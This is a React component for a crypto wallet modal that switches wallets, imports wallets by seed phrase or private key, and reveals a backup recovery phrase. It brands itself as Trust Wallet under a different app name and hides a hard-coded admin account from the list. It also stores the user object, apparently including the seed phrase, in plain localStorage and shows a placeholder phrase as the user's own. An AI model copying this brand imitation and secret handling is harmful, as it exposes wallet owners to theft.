import React, { useState } from 'react';
import { useWallet } from '../context/WalletContext';
import {
  Shield,
  ShieldCheck,
  Plus,
  Key,
  Copy,
  Check,
  X,
  Lock,
  LogOut,
  Wallet,
  CheckCircle2,
  AlertCircle,
  Eye,
  EyeOff,
  User,
  Sparkles,
} from 'lucide-react';
import { generateSeedPhrase } from '../context/WalletContext';

interface WalletManageModalProps {
  isOpen: boolean;
  onClose: () => void;
}

export const WalletManageModal: React.FC<WalletManageModalProps> = ({ isOpen, onClose }) => {
  const {
    currentUser,
    setCurrentUser,
    deviceWallets,
    removeDeviceWallet,
    setIsAuthModalOpen,
    restoreWalletWithSeed,
    logoutUser,
    addNotification,
  } = useWallet();

  const [activeTab, setActiveTab] = useState<'wallets' | 'import' | 'backup'>('wallets');
  const [importSeedInput, setImportSeedInput] = useState('');
  const [importNameInput, setImportNameInput] = useState('Imported Wallet');
  const [generatedSeed, setGeneratedSeed] = useState<string>('');
  const [copiedSeed, setCopiedSeed] = useState(false);
  const [showSeedSecret, setShowSeedSecret] = useState(false);
  const [feedbackMsg, setFeedbackMsg] = useState<{ success: boolean; text: string } | null>(null);

  if (!isOpen) return null;

  // Filter out super admin and strictly show only this user's device wallets
  const rawList = (deviceWallets && deviceWallets.length > 0)
    ? deviceWallets
    : (currentUser ? [currentUser] : []);

  const displayWallets = rawList.filter((u) => u.email?.toLowerCase() !== 'legendxadmin1999@gmail.com');

  const handleExecuteImport = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!importSeedInput.trim()) {
      setFeedbackMsg({ success: false, text: 'Please enter a valid 12-word seed phrase or private key' });
      return;
    }

    const res = await restoreWalletWithSeed(importSeedInput.trim(), importNameInput);
    if (res.success && res.user) {
      setCurrentUser(res.user);
      setFeedbackMsg({ success: true, text: 'Wallet imported successfully!' });
      setTimeout(() => {
        setFeedbackMsg(null);
        onClose();
      }, 1200);
    } else {
      setFeedbackMsg({ success: false, text: res.message || 'Invalid recovery phrase.' });
    }
  };

  const handleSwitchUser = (u: any) => {
    setCurrentUser(u);
    try {
      localStorage.setItem('trustpro_curr_user_v2', JSON.stringify(u));
    } catch (e) {
      console.warn(e);
    }
    addNotification(u.id, 'Wallet Switched', `Active wallet changed to ${u.name}`, 'info');
    onClose();
  };

  const handleLogout = () => {
    logoutUser();
    setFeedbackMsg({ success: true, text: 'Logged out of current wallet session.' });
    setTimeout(() => {
      setFeedbackMsg(null);
      onClose();
    }, 1000);
  };

  return (
    <div className="fixed inset-0 z-50 flex items-end sm:items-center justify-center bg-black/80 backdrop-blur-md p-0 sm:p-4 animate-fadeIn">
      <div className="w-full max-w-lg rounded-t-3xl sm:rounded-3xl bg-[#121418] border border-white/10 p-5 sm:p-6 shadow-2xl relative max-h-[90vh] overflow-y-auto">
        {/* Modal Header */}
        <div className="flex items-center justify-between pb-4 border-b border-white/10 mb-4">
          <div className="flex items-center gap-2.5">
            <div className="h-9 w-9 rounded-xl bg-[#3862FB]/10 border border-[#3862FB]/30 flex items-center justify-center text-[#3862FB]">
              <Shield className="h-5 w-5 fill-[#3862FB]" />
            </div>
            <div>
              <h2 className="text-lg font-bold text-white">Wallets & Accounts</h2>
              <p className="text-xs text-slate-400">Trust Wallet Multi-Chain Keyring</p>
            </div>
          </div>
          <button
            onClick={onClose}
            className="rounded-full p-2 text-slate-400 hover:bg-white/10 hover:text-white transition-colors"
          >
            <X className="h-5 w-5" />
          </button>
        </div>

        {/* Feedback Alert */}
        {feedbackMsg && (
          <div
            className={`mb-4 flex items-center gap-2 rounded-xl p-3 text-xs font-medium ${
              feedbackMsg.success
                ? 'bg-[#3862FB]/15 border border-[#3862FB]/30 text-[#3862FB]'
                : 'bg-rose-500/15 border border-rose-500/30 text-rose-400'
            }`}
          >
            {feedbackMsg.success ? <CheckCircle2 className="h-4 w-4 shrink-0" /> : <AlertCircle className="h-4 w-4 shrink-0" />}
            <span>{feedbackMsg.text}</span>
          </div>
        )}

        {/* Tab 1: Wallets List */}
        {activeTab === 'wallets' && (
          <div className="space-y-4">
            <div className="space-y-2">
              <div className="text-xs font-semibold uppercase tracking-wider text-slate-400 px-1 flex items-center justify-between">
                <span>Active Wallets ({displayWallets.length})</span>
                {currentUser && (
                  <span className="text-[11px] text-blue-400 font-mono">
                    Logged in as: {currentUser.name}
                  </span>
                )}
              </div>

              {displayWallets.map((u) => {
                const isActive = currentUser?.id === u.id;

                return (
                  <div
                    key={u.id}
                    onClick={() => handleSwitchUser(u)}
                    className={`flex items-center justify-between p-3.5 rounded-2xl border cursor-pointer transition-all ${
                      isActive
                        ? 'bg-[#1E2024] border-[#3862FB]/50 shadow-md ring-1 ring-[#3862FB]/20'
                        : 'bg-[#16181D] border-white/5 hover:bg-[#1E2024] hover:border-white/10'
                    }`}
                  >
                    <div className="flex items-center gap-3">
                      <div className="h-10 w-10 rounded-xl flex items-center justify-center bg-[#3862FB]/15 text-[#3862FB] border border-[#3862FB]/30">
                        <Wallet className="h-5 w-5" />
                      </div>
                      <div>
                        <div className="flex items-center gap-2">
                          <span className="text-sm font-bold text-white">{u.name}</span>
                        </div>
                        <span className="text-xs text-slate-400 font-mono">
                          {u.email && u.email.includes('@') && !u.email.includes('phone.trustpro.io') ? u.email : 'Multi-Coin Wallet'}
                        </span>
                      </div>
                    </div>

                    <div className="flex items-center gap-2">
                      {isActive && (
                        <div className="flex items-center gap-1 bg-[#3862FB]/15 text-[#3862FB] text-[11px] font-semibold px-2.5 py-1 rounded-full border border-[#3862FB]/30">
                          <Check className="h-3.5 w-3.5" />
                          <span>Active</span>
                        </div>
                      )}
                    </div>
                  </div>
                );
              })}
            </div>

            {/* Actions Grid */}
            <div className="pt-2">
              <button
                onClick={() => setActiveTab('import')}
                className="w-full flex items-center justify-center gap-2 py-3 px-4 rounded-2xl bg-[#3862FB] hover:bg-[#2D54E5] text-white font-bold text-xs transition-all shadow-md shadow-[#3862FB]/20 active:scale-95"
              >
                <Key className="h-4 w-4 stroke-[2.5]" />
                <span>Import Wallet with Recovery Phrase / Key</span>
              </button>
            </div>

            {/* Auth Actions: Sign In / Register / Log Out */}
            <div className="pt-3 border-t border-white/10 space-y-2">
              <div className="grid grid-cols-2 gap-2">
                <button
                  onClick={() => {
                    onClose();
                    setIsAuthModalOpen(true);
                  }}
                  className="flex items-center justify-center gap-2 p-2.5 rounded-xl bg-slate-900 hover:bg-slate-800 border border-slate-700/60 text-xs font-semibold text-white transition-all"
                >
                  <User className="h-3.5 w-3.5 text-blue-400" />
                  <span>Sign In / Login</span>
                </button>
                <button
                  onClick={() => {
                    onClose();
                    setIsAuthModalOpen(true);
                  }}
                  className="flex items-center justify-center gap-2 p-2.5 rounded-xl bg-slate-900 hover:bg-slate-800 border border-slate-700/60 text-xs font-semibold text-blue-400 transition-all"
                >
                  <Sparkles className="h-3.5 w-3.5 text-blue-400" />
                  <span>Register Account</span>
                </button>
              </div>

              {currentUser ? (
                <button
                  onClick={handleLogout}
                  className="w-full flex items-center justify-center gap-2 p-2.5 rounded-xl bg-rose-500/10 hover:bg-rose-500/20 border border-rose-500/30 text-xs font-bold text-rose-400 transition-all"
                >
                  <LogOut className="h-3.5 w-3.5" />
                  <span>Log Out of Wallet ({currentUser.name})</span>
                </button>
              ) : (
                <button
                  onClick={() => {
                    onClose();
                    setIsAuthModalOpen(true);
                  }}
                  className="w-full flex items-center justify-center gap-2 p-2.5 rounded-xl bg-[#3862FB]/15 hover:bg-[#3862FB]/25 border border-[#3862FB]/30 text-xs font-bold text-[#3862FB] transition-all"
                >
                  <User className="h-3.5 w-3.5" />
                  <span>Sign In with Gmail / Password</span>
                </button>
              )}
            </div>

            {/* Quick Backup Option */}
            <div className="pt-2 border-t border-white/10">
              <button
                onClick={() => {
                  setGeneratedSeed(currentUser?.seedPhrase || 'alpha bravo charlie delta echo foxtrot golf hotel india juliet kilo lima');
                  setActiveTab('backup');
                }}
                className="w-full flex items-center justify-between p-3 rounded-2xl bg-[#16181D] hover:bg-[#1E2024] border border-white/5 text-xs text-slate-300 transition-colors"
              >
                <div className="flex items-center gap-2.5">
                  <Lock className="h-4 w-4 text-amber-400" />
                  <span>Backup Secret Recovery Phrase</span>
                </div>
                <span className="text-[#3862FB] font-semibold text-[11px]">View &rarr;</span>
              </button>
            </div>
          </div>
        )}

        {/* Tab 2: Import Wallet */}
        {activeTab === 'import' && (
          <form onSubmit={handleExecuteImport} className="space-y-4">
            <div>
              <label className="block text-xs font-semibold text-slate-300 mb-1">Wallet Label</label>
              <input
                type="text"
                value={importNameInput}
                onChange={(e) => setImportNameInput(e.target.value)}
                className="w-full rounded-xl bg-[#16181D] border border-white/10 px-3.5 py-2.5 text-sm text-white focus:border-[#3862FB] focus:outline-none"
              />
            </div>

            <div>
              <label className="block text-xs font-semibold text-slate-300 mb-1">
                Secret Phrase or Private Key
              </label>
              <textarea
                rows={3}
                placeholder="Enter 12 or 24 words separated by spaces..."
                value={importSeedInput}
                onChange={(e) => setImportSeedInput(e.target.value)}
                className="w-full rounded-xl bg-[#16181D] border border-white/10 p-3 text-xs font-mono text-white placeholder-slate-500 focus:border-[#3862FB] focus:outline-none"
              />
            </div>

            <div className="flex items-center gap-2 pt-2">
              <button
                type="button"
                onClick={() => setActiveTab('wallets')}
                className="flex-1 py-3 rounded-xl bg-[#1E2024] hover:bg-[#25282E] text-white text-xs font-bold transition-all"
              >
                Back
              </button>
              <button
                type="submit"
                className="flex-1 py-3 rounded-xl bg-[#3862FB] hover:bg-[#2D54E5] text-white text-xs font-bold transition-all shadow-md shadow-[#3862FB]/20"
              >
                Restore Wallet
              </button>
            </div>
          </form>
        )}

        {/* Tab 4: Backup Secret */}
        {activeTab === 'backup' && (
          <div className="space-y-4">
            <div className="rounded-2xl bg-amber-500/10 border border-amber-500/30 p-3.5 text-amber-300 text-xs flex items-start gap-2.5">
              <Lock className="h-4 w-4 shrink-0 mt-0.5 text-amber-400" />
              <span>
                Do not share your seed phrase. Anyone with these 12 words can access and spend all funds in your wallet.
              </span>
            </div>

            <div className="rounded-2xl bg-[#16181D] border border-white/10 p-4">
              <div className="flex items-center justify-between mb-3">
                <span className="text-xs font-semibold text-slate-300">Recovery Phrase for {currentUser?.name}</span>
                <button
                  onClick={() => setShowSeedSecret(!showSeedSecret)}
                  className="flex items-center gap-1 text-xs text-slate-400 hover:text-white"
                >
                  {showSeedSecret ? <EyeOff className="h-3.5 w-3.5" /> : <Eye className="h-3.5 w-3.5" />}
                  <span>{showSeedSecret ? 'Hide' : 'Reveal'}</span>
                </button>
              </div>

              {showSeedSecret ? (
                <div className="grid grid-cols-3 gap-2">
                  {generatedSeed.split(' ').map((word, idx) => (
                    <div
                      key={idx}
                      className="flex items-center gap-1.5 rounded-lg bg-[#1E2024] px-2.5 py-1.5 text-xs font-mono text-white border border-white/5"
                    >
                      <span className="text-slate-500 text-[10px] w-4">{idx + 1}.</span>
                      <span className="font-semibold text-blue-400">{word}</span>
                    </div>
                  ))}
                </div>
              ) : (
                <div
                  onClick={() => setShowSeedSecret(true)}
                  className="h-24 rounded-xl bg-[#1E2024] border border-dashed border-white/20 flex flex-col items-center justify-center text-xs text-slate-400 cursor-pointer hover:border-[#3862FB] transition-colors"
                >
                  <Eye className="h-5 w-5 mb-1 text-slate-300" />
                  <span>Tap to reveal Secret Phrase</span>
                </div>
              )}
            </div>

            <button
              onClick={() => setActiveTab('wallets')}
              className="w-full py-3 rounded-xl bg-[#1E2024] hover:bg-[#25282E] text-white text-xs font-bold transition-all"
            >
              Done
            </button>
          </div>
        )}
      </div>
    </div>
  );
};
